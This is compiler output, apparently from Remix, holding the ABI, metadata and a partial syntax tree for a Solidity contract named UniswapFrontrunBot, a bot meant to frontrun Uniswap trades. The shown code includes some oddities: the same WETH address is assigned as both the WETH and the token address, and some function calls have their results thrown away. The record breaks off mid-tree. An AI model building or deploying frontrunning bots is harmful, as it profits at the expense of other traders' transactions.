							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"balanceOf(address)": "70a08231",
							"ethToTokenSwapInput(uint256,uint256)": "f39b5b9b",
							"removeLiquidity(uint256,uint256,uint256,uint256)": "f88bf15a",
							"tokenToEthSwapInput(uint256,uint256,uint256)": "95e3c50b",
							"transferFrom(address,address,uint256)": "23b872dd"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"ethToTokenSwapInput\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"removeLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"tokenToEthSwapInput\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol\":\"IUniswapV1Exchange\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol\":{\"keccak256\":\"0xcec8976f205e71a3a5ebdd7130d321484df4e4b6b1091d21d435173acfb6e14b\",\"urls\":[\"bzz-raw://681de3c6ee08cccee6839b3a65f8d80c2c6e55ba5a3aba51f83578a5fef52a65\",\"dweb:/ipfs/QmcJMhgj7CgchN4sxR8MbzJt8DrbJuB6PCdD2fdQ9Ct1qi\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol": {
				"IUniswapV1Factory": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "getExchange",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"getExchange(address)": "06f2bf62"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"getExchange\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol\":\"IUniswapV1Factory\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol\":{\"keccak256\":\"0x2a554e26d874fa4b10736f2e2ac1ba6253cd1ad08a97bd941cb0a41015565589\",\"urls\":[\"bzz-raw://bbe29db0ebf08621cb4211219c02262be9c7510fe03bab94f849a38993f957d6\",\"dweb:/ipfs/QmTutAVpjg925m4JLqHTvukdTyoTr77FotAUAA2AzGug1f\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			}
		},
		"sources": {
			"Frontrun Bot.sol": {
				"ast": {
					"absolutePath": "Frontrun Bot.sol",
					"exportedSymbols": {
						"UniswapFrontrunBot": [
							1680
						]
					},
					"id": 1681,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.6",
								".6"
							],
							"nodeType": "PragmaDirective",
							"src": "0:23:0"
						},
						{
							"absolutePath": "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol",
							"file": "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol",
							"id": 2,
							"nodeType": "ImportDirective",
							"scope": 1681,
							"sourceUnit": 1697,
							"src": "75:113:0",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol",
							"file": "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol",
							"id": 3,
							"nodeType": "ImportDirective",
							"scope": 1681,
							"sourceUnit": 1753,
							"src": "190:116:0",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol",
							"file": "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol",
							"id": 4,
							"nodeType": "ImportDirective",
							"scope": 1681,
							"sourceUnit": 1763,
							"src": "308:115:0",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 1680,
							"linearizedBaseContracts": [
								1680
							],
							"name": "UniswapFrontrunBot",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"functionSelector": "6c02a931",
									"id": 6,
									"mutability": "mutable",
									"name": "tokenName",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 1680,
									"src": "466:23:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_string_storage",
										"typeString": "string"
									},
									"typeName": {
										"id": 5,
										"name": "string",
										"nodeType": "ElementaryTypeName",
										"src": "466:6:0",
										"typeDescriptions": {
											"typeIdentifier": "t_string_storage_ptr",
											"typeString": "string"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"functionSelector": "7b61c320",
									"id": 8,
									"mutability": "mutable",
									"name": "tokenSymbol",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 1680,
									"src": "496:25:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_string_storage",
										"typeString": "string"
									},
									"typeName": {
										"id": 7,
										"name": "string",
										"nodeType": "ElementaryTypeName",
										"src": "496:6:0",
										"typeDescriptions": {
											"typeIdentifier": "t_string_storage_ptr",
											"typeString": "string"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 10,
									"mutability": "mutable",
									"name": "frontrun",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 1680,
									"src": "528:13:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 9,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "528:4:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": null,
									"visibility": "internal"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 14,
									"name": "Log",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 13,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 12,
												"indexed": false,
												"mutability": "mutable",
												"name": "_msg",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 14,
												"src": "561:11:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 11,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "561:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "560:13:0"
									},
									"src": "551:23:0"
								},
								{
									"body": {
										"id": 29,
										"nodeType": "Block",
										"src": "656:78:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 23,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 21,
														"name": "tokenName",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 6,
														"src": "667:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_string_storage",
															"typeString": "string storage ref"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 22,
														"name": "_tokenName",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 16,
														"src": "679:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string memory"
														}
													},
													"src": "667:22:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage",
														"typeString": "string storage ref"
													}
												},
												"id": 24,
												"nodeType": "ExpressionStatement",
												"src": "667:22:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 27,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 25,
														"name": "tokenSymbol",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 8,
														"src": "700:11:0",
														"typeDescriptions": {
															"typeIdentifier": "t_string_storage",
															"typeString": "string storage ref"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 26,
														"name": "_tokenSymbol",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 18,
														"src": "714:12:0",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string memory"
														}
													},
													"src": "700:26:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage",
														"typeString": "string storage ref"
													}
												},
												"id": 28,
												"nodeType": "ExpressionStatement",
												"src": "700:26:0"
											}
										]
									},
									"documentation": null,
									"id": 30,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 19,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 16,
												"mutability": "mutable",
												"name": "_tokenName",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 30,
												"src": "595:24:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 15,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "595:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 18,
												"mutability": "mutable",
												"name": "_tokenSymbol",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 30,
												"src": "621:26:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 17,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "621:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "594:54:0"
									},
									"returnParameters": {
										"id": 20,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "656:0:0"
									},
									"scope": 1680,
									"src": "583:151:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 33,
										"nodeType": "Block",
										"src": "770:2:0",
										"statements": []
									},
									"documentation": null,
									"id": 34,
									"implemented": true,
									"kind": "receive",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 31,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "750:2:0"
									},
									"returnParameters": {
										"id": 32,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "770:0:0"
									},
									"scope": 1680,
									"src": "743:29:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"canonicalName": "UniswapFrontrunBot.slice",
									"id": 39,
									"members": [
										{
											"constant": false,
											"id": 36,
											"mutability": "mutable",
											"name": "_len",
											"nodeType": "VariableDeclaration",
											"overrides": null,
											"scope": 39,
											"src": "805:9:0",
											"stateVariable": false,
											"storageLocation": "default",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											},
											"typeName": {
												"id": 35,
												"name": "uint",
												"nodeType": "ElementaryTypeName",
												"src": "805:4:0",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												}
											},
											"value": null,
											"visibility": "internal"
										},
										{
											"constant": false,
											"id": 38,
											"mutability": "mutable",
											"name": "_ptr",
											"nodeType": "VariableDeclaration",
											"overrides": null,
											"scope": 39,
											"src": "825:9:0",
											"stateVariable": false,
											"storageLocation": "default",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											},
											"typeName": {
												"id": 37,
												"name": "uint",
												"nodeType": "ElementaryTypeName",
												"src": "825:4:0",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												}
											},
											"value": null,
											"visibility": "internal"
										}
									],
									"name": "slice",
									"nodeType": "StructDefinition",
									"scope": 1680,
									"src": "781:61:0",
									"visibility": "public"
								},
								{
									"body": {
										"id": 187,
										"nodeType": "Block",
										"src": "1174:1311:0",
										"statements": [
											{
												"assignments": [
													49
												],
												"declarations": [
													{
														"constant": false,
														"id": 49,
														"mutability": "mutable",
														"name": "shortest",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 187,
														"src": "1185:13:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 48,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "1185:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 52,
												"initialValue": {
													"argumentTypes": null,
													"expression": {
														"argumentTypes": null,
														"id": 50,
														"name": "self",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 41,
														"src": "1201:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
															"typeString": "struct UniswapFrontrunBot.slice memory"
														}
													},
													"id": 51,
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"memberName": "_len",
													"nodeType": "MemberAccess",
													"referencedDeclaration": 36,
													"src": "1201:9:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1185:25:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 57,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 53,
															"name": "other",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 43,
															"src": "1227:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
																"typeString": "struct UniswapFrontrunBot.slice memory"
															}
														},
														"id": 54,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 36,
														"src": "1227:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 55,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 41,
															"src": "1240:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
																"typeString": "struct UniswapFrontrunBot.slice memory"
															}
														},
														"id": 56,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 36,
														"src": "1240:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1227:22:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 63,
												"nodeType": "IfStatement",
												"src": "1223:63:0",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"id": 61,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 58,
															"name": "shortest",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 49,
															"src": "1265:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 59,
																"name": "other",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 43,
																"src": "1276:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
																	"typeString": "struct UniswapFrontrunBot.slice memory"
																}
															},
															"id": 60,
															"isConstant": false,
															"isLValue": true,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "_len",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 36,
															"src": "1276:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "1265:21:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 62,
													"nodeType": "ExpressionStatement",
													"src": "1265:21:0"
												}
											},
											{
												"assignments": [
													65
												],
												"declarations": [
													{
														"constant": false,
														"id": 65,
														"mutability": "mutable",
														"name": "selfptr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 187,
														"src": "1300:12:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 64,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "1300:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 68,
												"initialValue": {
													"argumentTypes": null,
													"expression": {
														"argumentTypes": null,
														"id": 66,
														"name": "self",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 41,
														"src": "1315:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
															"typeString": "struct UniswapFrontrunBot.slice memory"
														}
													},
													"id": 67,
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"memberName": "_ptr",
													"nodeType": "MemberAccess",
													"referencedDeclaration": 38,
													"src": "1315:9:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1300:24:0"
											},
											{
												"assignments": [
													70
												],
												"declarations": [
													{
														"constant": false,
														"id": 70,
														"mutability": "mutable",
														"name": "otherptr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 187,
														"src": "1335:13:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 69,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "1335:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 73,
												"initialValue": {
													"argumentTypes": null,
													"expression": {
														"argumentTypes": null,
														"id": 71,
														"name": "other",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 43,
														"src": "1351:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
															"typeString": "struct UniswapFrontrunBot.slice memory"
														}
													},
													"id": 72,
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"memberName": "_ptr",
													"nodeType": "MemberAccess",
													"referencedDeclaration": 38,
													"src": "1351:10:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1335:26:0"
											},
											{
												"body": {
													"id": 173,
													"nodeType": "Block",
													"src": "1421:1007:0",
													"statements": [
														{
															"assignments": [
																86
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 86,
																	"mutability": "mutable",
																	"name": "a",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 173,
																	"src": "1477:6:0",
																	"stateVariable": false,
																	"storageLocation": "default",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"typeName": {
																		"id": 85,
																		"name": "uint",
																		"nodeType": "ElementaryTypeName",
																		"src": "1477:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 87,
															"initialValue": null,
															"nodeType": "VariableDeclarationStatement",
															"src": "1477:6:0"
														},
														{
															"assignments": [
																89
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 89,
																	"mutability": "mutable",
																	"name": "b",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 173,
																	"src": "1498:6:0",
																	"stateVariable": false,
																	"storageLocation": "default",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"typeName": {
																		"id": 88,
																		"name": "uint",
																		"nodeType": "ElementaryTypeName",
																		"src": "1498:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 90,
															"initialValue": null,
															"nodeType": "VariableDeclarationStatement",
															"src": "1498:6:0"
														},
														{
															"assignments": [
																92
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 92,
																	"mutability": "mutable",
																	"name": "WETH_CONTRACT_ADDRESS",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 173,
																	"src": "1522:35:0",
																	"stateVariable": false,
																	"storageLocation": "memory",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string"
																	},
																	"typeName": {
																		"id": 91,
																		"name": "string",
																		"nodeType": "ElementaryTypeName",
																		"src": "1522:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_storage_ptr",
																			"typeString": "string"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 94,
															"initialValue": {
																"argumentTypes": null,
																"hexValue": "307863303261616133396232323366653864306130653563346632376561643930383363373536636332",
																"id": 93,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "string",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1560:44:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_stringliteral_5270116ddce6ea9bbc0c25fe85461affe258517d80c431366a2308e1e2ce7379",
																	"typeString": "literal_string \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\""
																},
																"value": "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"
															},
															"nodeType": "VariableDeclarationStatement",
															"src": "1522:82:0"
														},
														{
															"assignments": [
																96
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 96,
																	"mutability": "mutable",
																	"name": "TOKEN_CONTRACT_ADDRESS",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 173,
																	"src": "1619:36:0",
																	"stateVariable": false,
																	"storageLocation": "memory",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string"
																	},
																	"typeName": {
																		"id": 95,
																		"name": "string",
																		"nodeType": "ElementaryTypeName",
																		"src": "1619:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_storage_ptr",
																			"typeString": "string"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 98,
															"initialValue": {
																"argumentTypes": null,
																"hexValue": "307863303261616133396232323366653864306130653563346632376561643930383363373536636332",
																"id": 97,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "string",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1658:44:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_stringliteral_5270116ddce6ea9bbc0c25fe85461affe258517d80c431366a2308e1e2ce7379",
																	"typeString": "literal_string \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\""
																},
																"value": "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"
															},
															"nodeType": "VariableDeclarationStatement",
															"src": "1619:83:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 100,
																		"name": "WETH_CONTRACT_ADDRESS",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 92,
																		"src": "1737:21:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	],
																	"id": 99,
																	"name": "loadCurrentContract",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 328,
																	"src": "1717:19:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																		"typeString": "function (string memory) pure returns (string memory)"
																	}
																},
																"id": 101,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1717:42:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_string_memory_ptr",
																	"typeString": "string memory"
																}
															},
															"id": 102,
															"nodeType": "ExpressionStatement",
															"src": "1717:42:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 104,
																		"name": "TOKEN_CONTRACT_ADDRESS",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 96,
																		"src": "1794:22:0",
